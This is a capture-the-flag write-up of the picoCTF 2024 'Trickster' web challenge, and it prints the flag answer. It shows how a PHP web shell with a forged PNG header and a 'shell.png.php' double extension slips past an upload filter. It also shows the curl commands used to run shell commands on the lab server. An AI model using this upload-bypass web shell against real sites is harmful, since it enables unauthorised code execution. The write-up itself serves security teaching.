---
title: "picoCTF 2024 — Trickster"
date: 2024-03-01
tags: [web, file-upload, rce, picoctf]
ctf: "picoCTF 2024"
summary: "Bypassing PNG file upload validation to achieve Remote Code Execution (RCE) via a malicious PHP file."
draft: false
---

**Flag:** `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}`

## Challenge Summary

The challenge presents a simple "PNG processing app" a web page with a file upload form that claims to accept only PNG images. The goal is to bypass the file-type validation, achieve remote code execution (RCE) by uploading a malicious PHP file disguised as a PNG, and read a flag file from the server.

## Recon

Visiting the app shows a single upload form:

```
Welcome to my PNG processing app
[Choose File] [Upload File]
```

Uploading a `.php` file with no PNG content produced:

```
Error: File name does not contain '.png'.
```

This revealed the first validation layer: a **filename check** requiring the substring `.png` to appear somewhere in the uploaded filename.

## Step 1 Bypassing the filename check

Uploading a file named `test.png` containing a PHP webshell:

php

```php
<?php system($_GET['cmd']); ?>
```

passed the filename check but triggered a second error:

```
Error: The file is not a valid PNG image: 3c3f7068
```

The hex `3c3f7068` decodes to `<?ph`  the first bytes of the uploaded content. This confirmed a **magic-byte check**: the server inspects the first bytes of the file content and compares them against the real PNG signature.

## Step 2  Bypassing the magic-byte check

The PNG file signature is 8 bytes:

```
89 50 4E 47 0D 0A 1A 0A
```

A file was built with those raw bytes prepended to the PHP payload:

bash

```bash
python3 -c "open('shell.png','wb').write(b'\x89PNG\r\n\x1a\n<?php system(\$_GET[\"cmd\"]); ?>')"
```

Verified with `xxd`:

```
8950 4e47 0d0a 1a0a 3c3f 7068 7020 7379  .PNG....<?php sy
7374 656d 2824 5f47 4554 5b22 636d 6422  stem($_GET["cmd"
5d29 3b20 3f3e                           ]); ?>
```

Uploading this file succeeded:

```
File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
```

The file was accessible at `/uploads/shell.png`, confirming both checks were purely superficial (magic bytes + filename substring), with no real image parsing or content validation.

## Step 3 Getting the file to execute as PHP

A file saved as `shell.png` is served by Apache as a static file the extension doesn't tell Apache to invoke the PHP interpreter. Since the filename check was a **substring** check (`.png` anywhere in the name) rather than a suffix check (`filename.endswith('.png')`), it was possible to abuse extension ordering:

- `shell.php.png` → contains `.png`, passes the filter, but Apache treats `.png` as the final/effective extension → served as a static file (confirmed, no execution).
- `shell.png.php` → **also contains `.png`**, passes the filter, but Apache treats `.php` (the last extension) as the effective one → **executed as PHP**.

Built and uploaded:

```bash
python3 -c "open('shell.png.php','wb').write(b'\x89PNG\r\n\x1a\n<?php system(\$_GET[\"cmd\"]); ?>')"
curl -F "file=@shell.png.php;type=image/png" http://atlas.picoctf.net:PORT/
```

Confirmed RCE:


```bash
curl -G "http://atlas.picoctf.net:PORT/uploads/shell.png.php" --data-urlencode "cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Step 4 Locating and reading the flag

Listing the web root revealed a randomly-named text file that didn't match typical "flag" naming patterns (so a straightforward `find / -iname '*flag*'` search missed it):

bash

```bash
curl -G "http://atlas.picoctf.net:PORT/uploads/shell.png.php" --data-urlencode "cmd=ls -la /var/www/html"
```

```
-rw-r--r-- 1 root root 49 Mar 12  2024 G4ZTCOJYMJSDS.txt
-rw-r--r-- 1 root root 1572 Feb  7  2024 index.php
-rw-r--r-- 1 root root 415 Feb  7  2024 instructions.txt
-rw-r--r-- 1 root root 62 Feb  7  2024 robots.txt
drwxr-xr-x 1 www-data root 48 Aug 16 11:47 uploads
```

Reading the file:

bash

```bash
curl -G "http://atlas.picoctf.net:PORT/uploads/shell.png.php" --data-urlencode "cmd=cat /var/www/html/G4ZTCOJYMJSDS.txt"
```

```
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9} */
```


=
